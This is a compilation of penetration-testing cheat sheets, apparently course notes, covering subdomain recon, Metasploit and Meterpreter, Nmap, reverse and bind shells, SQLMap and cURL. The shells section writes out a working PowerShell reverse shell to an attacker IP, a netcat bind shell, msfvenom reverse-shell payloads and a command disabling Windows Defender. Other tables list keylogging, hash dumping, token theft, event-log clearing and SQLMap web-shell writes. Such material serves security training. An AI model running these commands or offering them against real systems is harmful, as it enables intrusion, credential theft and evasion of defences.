| `curl -s https://sonar.omnisint.io/tlds/{domain} \| jq -r '.[]' \| sort -u` | All TLDs found for a given domain. |
| `curl -s https://sonar.omnisint.io/all/{domain} \| jq -r '.[]' \| sort -u` | All results across all TLDs for a given domain. |
| `curl -s https://sonar.omnisint.io/reverse/{ip} \| jq -r '.[]' \| sort -u` | Reverse DNS lookup on IP address. |
| `curl -s https://sonar.omnisint.io/reverse/{ip}/{mask} \| jq -r '.[]' \| sort -u` | Reverse DNS lookup of a CIDR range. |
| `curl -s "https://crt.sh/?q=${TARGET}&output=json" \| jq -r '.[] \| "\(.name_value)\n\(.common_name)"' \| sort -u` | Certificate Transparency. |
| `cat sources.txt \| while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}-${TARGET}";done` | Searching for subdomains and other information on the sources provided in the source.txt list. |

#### Sources.txt
```txt
baidu
bufferoverun
crtsh
hackertarget
otx
projecdiscovery
rapiddns
sublist3r
threatcrowd
trello
urlscan
vhost
virustotal
zoomeye
```

---
## Passive Infrastructure Identification

| **Resource/Command** | **Description** |
|-|-|
| `Netcraft` | [https://www.netcraft.com/](https://www.netcraft.com/) |
| `WayBackMachine` | [http://web.archive.org/](http://web.archive.org/) |
| `WayBackURLs` | [https://github.com/tomnomnom/waybackurls](https://github.com/tomnomnom/waybackurls) |
| `waybackurls -dates https://$TARGET > waybackurls.txt` | Crawling URLs from a domain with the date it was obtained. |


---
## Active Infrastructure Identification

| **Resource/Command** | **Description** |
|-|-|
| `curl -I "http://${TARGET}"` | Display HTTP headers of the target webserver. |
| `whatweb -a https://www.facebook.com -v` | Technology identification. |
| `Wappalyzer` | [https://www.wappalyzer.com/](https://www.wappalyzer.com/) |
| `wafw00f -v https://$TARGET` | WAF Fingerprinting. |
| `Aquatone` | [https://github.com/michenriksen/aquatone](https://github.com/michenriksen/aquatone) |
| `cat subdomain.list \| aquatone -out ./aquatone -screenshot-timeout 1000` | Makes screenshots of all subdomains in the subdomain.list. |


---
## Active Subdomain Enumeration

| **Resource/Command** | **Description** |
|-|-|
| `HackerTarget` | [https://hackertarget.com/zone-transfer/](https://hackertarget.com/zone-transfer/) |
| `SecLists` | [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) |
| `nslookup -type=any -query=AXFR $TARGET nameserver.target.domain` | Zone Transfer using Nslookup against the target domain and its nameserver. |
| `gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"` | Bruteforcing subdomains. |


---
## Virtual Hosts

| **Resource/Command** | **Description** |
|-|-|
| `curl -s http://192.168.10.10 -H "Host: randomtarget.com"` | Changing the HOST HTTP header to request a specific domain. |
| `cat ./vhosts.list \| while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://<IP address> -H "HOST: ${vhost}.target.domain" \| grep "Content-Length: ";done` | Bruteforcing for possible virtual hosts on the target domain. |
| `ffuf -w ./vhosts -u http://<IP address> -H "HOST: FUZZ.target.domain" -fs 612` | Bruteforcing for possible virtual hosts on the target domain using `ffuf`. |


---
## Crawling

| **Resource/Command** | **Description** |
|-|-|
| `ZAP` | [https://www.zaproxy.org/](https://www.zaproxy.org/) |
| `ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt` | Discovering files and folders that cannot be spotted by browsing the website.
| `ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://www.target.domain/FOLDERS/WORDLISTEXTENSIONS` | Mutated bruteforcing against the target web server. |# MetaSploit
## MSFconsole Commands 

| **Command**        | **Description**                                                  |
| :--------------- | :----------------------------------------------------------- |
| `show exploits` | Show all exploits within the Framework.                      |
| `show payloads`  | Show all payloads within the Framework.                      |
| `show auxiliary` | Show all auxiliary modules within the Framework.             |
| `search <name>` | Search for exploits or modules within the Framework.         |
| `info`         | Load information about a specific exploit or module.         |
| `use <name>` | Load an exploit or module (example: use windows/smb/psexec). |
| `use <number>` | Load an exploit by using the index number displayed after the search <name> command. |
| `LHOST`        | Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells. |
| `RHOST`        | The remote host or the target. set function Set a specific value (for example, LHOST or RHOST). |
| `setg <function>` | Set a specific value globally (for example, LHOST or RHOST). |
| `show options` | Show the options available for a module or exploit.          |
| `show targets` | Show the platforms supported by the exploit.                 |
| `set target <number>` | Specify a specific target index if you know the OS and service pack. |
| `set payload <payload>` | Specify the payload to use. |
| `set payload <number>` | Specify the payload index number to use after the show payloads command. |
| `show advanced` | Show advanced options. |
| `set autorunscript migrate -f` | Automatically migrate to a separate process upon exploit completion. |
| `check` | Determine whether a target is vulnerable to an attack. |
| `exploit` | Execute the module or exploit and attack the target. |
| `exploit -j` | Run the exploit under the context of the job. (This will run the exploit in the background.) |
| `exploit -z` | Do not interact with the session after successful exploitation. |
| `exploit -e <encoder>` | Specify the payload encoder to use (example: exploit –e shikata_ga_nai). |
| `exploit -h` | Display help for the exploit command. |
| `sessions -l` | List available sessions (used when handling multiple shells). |
| `sessions -l -v` | List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system. |
| `sessions -s <script>` | Run a specific Meterpreter script on all Meterpreter live sessions. |
| `sessions -K` | Kill all live sessions. |
| `sessions -c <cmd>` | Execute a command on all live Meterpreter sessions. |
| `sessions -u <sessionID>` | Upgrade a normal Win32 shell to a Meterpreter console. |
| `db_create <name>` | Create a database to use with database-driven attacks (example: db_create autopwn). |
| `db_connect <name>` | Create and connect to a database for driven attacks (example: db_connect autopwn). |
| `db_nmap` | Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as –sT –v –P0.) |
| `db_destroy` | Delete the current database. |
| `db_destroy  <user:password@host:port/database>` | Delete database using advanced options. |
|                |                                                              |


----
## Meterpreter Commands 

| **Command**                                                     | **Description**                                                  |
| :---------------------------------------------------------- | :----------------------------------------------------------- |
| `help`                                                      | Open Meterpreter usage help.                                 |
| `run <scriptname>`                                        | Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory. |
| `sysinfo`                                                   | Show the system information on the compromised target.       |
| `ls`                                                        | List the files and folders on the target.                    |
| `use priv`                                                  | Load the privilege extension for extended Meterpreter libraries. |
| `ps`                                                        | Show all running processes and which accounts are associated with each process. |
| `migrate <proc. id>`                                      | Migrate to the specific process ID (PID is the target process ID gained from the ps command). |
| `use incognito`                                             | Load incognito functions. (Used for token stealing and impersonation on a target machine.) |
| `list_tokens -u`                                            | List available tokens on the target by user.                 |
| `list_tokens -g`                                            | List available tokens on the target by group.                |
| `impersonate_token <DOMAIN_NAMEUSERNAME>`               | Impersonate a token available on the target.                 |
| `steal_token <proc. id>`                                  | Steal the tokens available for a given process and impersonate that token. |
| `drop_token`                                                | Stop impersonating the current token.                        |
| `getsystem`                                                 | Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors. |
| `shell`                                                     | Drop into an interactive shell with all available tokens.    |
| `execute -f <cmd.exe> -i`                                 | Execute cmd.exe and interact with it.                        |
| `execute -f <cmd.exe> -i -t`                              | Execute cmd.exe with all available tokens.                   |
| `execute -f <cmd.exe> -i -H -t`                           | Execute cmd.exe with all available tokens and make it a hidden process. |
| `rev2self`                                                  | Revert back to the original user you used to compromise the target. |
| `reg <command>`                                           | Interact, create, delete, query, set, and much more in the target’s registry. |
| `setdesktop <number>`                                     | Switch to a different screen based on who is logged in.      |
| `screenshot`                                                | Take a screenshot of the target’s screen.                    |
| `upload <filename>`                                       | Upload a file to the target.                                 |
| `download <filename>`                                     | Download a file from the target.                             |
| `keyscan_start`                                             | Start sniffing keystrokes on the remote target.              |
| `keyscan_dump`                                              | Dump the remote keys captured on the target.                 |
| `keyscan_stop`                                              | Stop sniffing keystrokes on the remote target.               |
| `getprivs`                                                  | Get as many privileges as possible on the target.            |
| `uictl enable <keyboard/mouse>`                           | Take control of the keyboard and/or mouse.                   |
| `background`                                                | Run your current Meterpreter shell in the background.        |
| `hashdump`                                                  | Dump all hashes on the target. use sniffer Load the sniffer module. |
| `sniffer_interfaces`                                        | List the available interfaces on the target.                 |
| `sniffer_dump <interfaceID> pcapname`                     | Start sniffing on the remote target.                         |
| `sniffer_start <interfaceID> packet-buffer`               | Start sniffing with a specific range for a packet buffer.    |
| `sniffer_stats <interfaceID>`                             | Grab statistical information from the interface you are sniffing. |
| `sniffer_stop <interfaceID>`                              | Stop the sniffer.                                            |
| `add_user <username> <password> -h <ip>`              | Add a user on the remote target.                             |
| `add_group_user <"Domain Admins"> <username> -h <ip>` | Add a username to the Domain Administrators group on the remote target. |
| `clearev`                                                   | Clear the event log on the target machine.                   |
| `timestomp`                                                 | Change file attributes, such as creation date (antiforensics measure). |
| `reboot`                                                    | Reboot the target machine.                                   |
|                                                             |                                                              |
# NMAP
## Scanning Options

| **Nmap Option** | **Description** |
|---|----|
| `10.10.10.0/24` | Target network range. |
| `-sn` | Disables port scanning. |
| `-Pn` | Disables ICMP Echo Requests |
| `-n` | Disables DNS Resolution. |
| `-PE` | Performs the ping scan by using ICMP Echo Requests against the target. |
| `--packet-trace` | Shows all packets sent and received. |
| `--reason` | Displays the reason for a specific result. |
| `--disable-arp-ping` | Disables ARP Ping Requests. |
| `--top-ports=<num>` | Scans the specified top ports that have been defined as most frequent.  |
| `-p-` | Scan all ports. |
| `-p22-110` | Scan all ports between 22 and 110. |
| `-p22,25` | Scans only the specified ports 22 and 25. |
| `-F` | Scans top 100 ports. |
| `-sS` | Performs an TCP SYN-Scan. |
| `-sA` | Performs an TCP ACK-Scan. |
| `-sU` | Performs an UDP Scan. |
| `-sV` | Scans the discovered services for their versions. |
| `-sC` | Perform a Script Scan with scripts that are categorized as "default". |
| `--script <script>` | Performs a Script Scan by using the specified scripts. |
| `-O` | Performs an OS Detection Scan to determine the OS of the target. |
| `-A` | Performs OS Detection, Service Detection, and traceroute scans. |
| `-D RND:5` | Sets the number of random Decoys that will be used to scan the target. |
| `-e` | Specifies the network interface that is used for the scan. |
| `-S 10.10.10.200` | Specifies the source IP address for the scan. |
| `-g` | Specifies the source port for the scan. |
| `--dns-server <ns>` | DNS resolution is performed by using a specified name server. |




## Output Options


| **Nmap Option** | **Description** |
|---|----|
| `-oA filename` | Stores the results in all available formats starting with the name of "filename". |
| `-oN filename` | Stores the results in normal format with the name "filename". |
| `-oG filename` | Stores the results in "grepable" format with the name of "filename". |
| `-oX filename` | Stores the results in XML format with the name of "filename". |



## Performance Options

| **Nmap Option** | **Description** |
|---|----|
| `--max-retries <num>` | Sets the number of retries for scans of specific ports. |
| `--stats-every=5s` | Displays scan's status every 5 seconds. |
| `-v/-vv` | Displays verbose output during the scan. |
| `--initial-rtt-timeout 50ms` | Sets the specified time value as initial RTT timeout. |
| `--max-rtt-timeout 100ms` | Sets the specified time value as maximum RTT timeout. |
| `--min-rate 300` | Sets the number of packets that will be sent simultaneously. |
| `-T <0-5>` | Specifies the specific timing template. |

#nmap #hacking #cheatsheet #shell #webshell #payload #cheatsheet 

# Shells and Payloads
|   |   |
|---|---|
|`xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!`|CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol|
|`env`|Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use|
|`sudo nc -lvnp <port #>`|Starts a `netcat` listener on a specified port|
|`nc -nv <ip address of computer with listener started><port being listened on>`|Connects to a netcat listener at the specified IP address and port|
|`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f`|Uses netcat to bind a shell (`/bin/bash`) the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on|
|`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`|`Powershell` one-liner used to connect back to a listener that has been started on an attack box|
|`Set-MpPreference -DisableRealtimeMonitoring $true`|Powershell command using to disable real time monitoring in `Windows Defender`|
|`use exploit/windows/smb/psexec`|Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec`|
|`shell`|Command used in a meterpreter shell session to drop into a `system shell`|
|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf`|`MSFvenom` command used to generate a linux-based reverse shell `stageless payload`|
|`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe`|MSFvenom command used to generate a Windows-based reverse shell stageless payload|
|`msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho`|MSFvenom command used to generate a MacOS-based reverse shell payload|
|`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp`|MSFvenom command used to generate a ASP web reverse shell payload|
|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp`|MSFvenom command used to generate a JSP web reverse shell payload|
|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war`|MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload|
|`use auxiliary/scanner/smb/smb_ms17_010`|Metasploit exploit module used to check if a host is vulnerable to `ms17_010`|
|`use exploit/windows/smb/ms17_010_psexec`|Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17_010|
|`use exploit/linux/http/rconfig_vendors_auth_file_upload_rce`|Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting `rConfig 3.9.6`|
|`python -c 'import pty; pty.spawn("/bin/sh")'`|Python command used to spawn an `interactive shell` on a linux-based system|
|`/bin/sh -i`|Spawns an interactive shell on a linux-based system|
|`perl —e 'exec "/bin/sh";'`|Uses `perl` to spawn an interactive shell on a linux-based system|
|`ruby: exec "/bin/sh"`|Uses `ruby` to spawn an interactive shell on a linux-based system|
|`Lua: os.execute('/bin/sh')`|Uses `Lua` to spawn an interactive shell on a linux-based system|
|`awk 'BEGIN {system("/bin/sh")}'`|Uses `awk` command to spawn an interactive shell on a linux-based system|
|`find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`|Uses `find` command to spawn an interactive shell on a linux-based system|
|`find . -exec /bin/sh \; -quit`|An alternative way to use the `find` command to spawn an interactive shell on a linux-based system|
|`vim -c ':!/bin/sh'`|Uses the text-editor `VIM` to spawn an interactive shell. Can be used to escape "jail-shells"|
|`ls -la <path/to/fileorbinary>`|Used to `list` files & directories on a linux-based system and shows the permission for each file in the chosen directory. Can be used to look for binaries that we have permission to execute|
|`sudo -l`|Displays the commands that the currently logged on user can run as `sudo`|
|`/usr/share/webshells/laudanum`|Location of `laudanum webshells` on ParrotOS and Pwnbox|
|`/usr/share/nishang/Antak-WebShell`|Location of `Antak-Webshell` on Parrot OS and Pwnbox|
# SQLMap
| **Command**                                                  | **Description**                                             |
| ------------------------------------------------------------ | ----------------------------------------------------------- |
| `sqlmap -h`                                                  | View the basic help menu                                    |
| `sqlmap -hh`                                                 | View the advanced help menu                                 |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`   | Run `SQLMap` without asking for user input                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`  | `SQLMap` with POST request                                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'` | POST request specifying an injection point with an asterisk |
| `sqlmap -r req.txt`                                          | Passing an HTTP request file to `SQLMap`                    |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'` | Specifying a cookie header                                  |
| `sqlmap -u www.target.com --data='id=1' --method PUT`        | Specifying a PUT request                                    |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt` | Store traffic to an output file                             |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch` | Specify verbosity level                                     |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"` | Specifying a prefix or suffix                               |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`             | Specifying the level and risk                               |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba` | Basic DB enumeration                                        |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb` | Table enumeration                                           |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname` | Table/row enumeration                                       |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` | Conditional enumeration                                     |
| `sqlmap -u "http://www.example.com/?id=1" --schema`          | Database schema enumeration                                 |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`  | Searching for data                                          |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch` | Password enumeration and cracking                           |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass                                      |
| `sqlmap --list-tampers`                                      | List all tamper scripts                                     |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba` | Check for DBA privileges                                    |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"` | Reading a local file                                        |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Writing a file                                              |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`        | Spawning an OS shell                                        |

#sqlmap #sqli #hacking #cheatsheet # Web Requests
## cURL

| **Command** | **Description** |
| --------------|-------------------|
| `curl -h` | cURL help menu |
| `curl inlanefreight.com` | Basic GET request |
| `curl -s -O inlanefreight.com/index.html` | Download file |
| `curl -k https://inlanefreight.com` | Skip HTTPS (SSL) certificate validation |
| `curl inlanefreight.com -v` | Print full HTTP request/response details |
| `curl -I https://www.inlanefreight.com` | Send HEAD request (only prints response headers) |
| `curl -i https://www.inlanefreight.com` | Print response headers and response body |
| `curl https://www.inlanefreight.com -A 'Mozilla/5.0'` | Set User-Agent header |
| `curl -u admin:admin http://<SERVER_IP>:<PORT>/` | Set HTTP basic authorization credentials |
| `curl  http://admin:admin@<SERVER_IP>:<PORT>/` | Pass HTTP basic authorization credentials in the URL |
| `curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/` | Set request header |
| `curl 'http://<SERVER_IP>:<PORT>/search.php?search=le'` | Pass GET parameters |
| `curl -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/` | Send POST request with POST data |
| `curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/` | Set request cookies |
| `curl -X POST -d '{"search":"london"}' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php` | Send POST request with JSON data |

## APIs
| **Command** | **Description** |
| --------------|-------------------|
| `curl http://<SERVER_IP>:<PORT>/api.php/city/london` | Read entry |
| `curl -s http://<SERVER_IP>:<PORT>/api.php/city/ \| jq` | Read all entries |
| `curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` | Create (add) entry |
| `curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` | Update (modify) entry |
| `curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City` | Delete entry |

## Browser DevTools

| **Shortcut** | **Description** |
| --------------|-------------------|
| [`CTRL+SHIFT+I`] or [`F12`] | Show devtools |
| [`CTRL+SHIFT+E`] | Show Network tab |
| [`CTRL+SHIFT+K`] | Show Console tab |